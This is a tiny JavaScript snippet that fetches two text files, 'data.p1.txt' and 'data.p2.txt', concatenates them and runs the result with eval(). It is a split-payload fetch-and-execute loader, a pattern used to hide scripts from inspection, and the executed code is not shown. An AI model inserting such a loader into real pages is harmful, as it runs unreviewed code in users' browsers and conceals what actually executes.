(async function(){
  const a = await (await fetch("data.p1.txt")).text();
  const b = await (await fetch("data.p2.txt")).text();
  eval(a+b);
})();
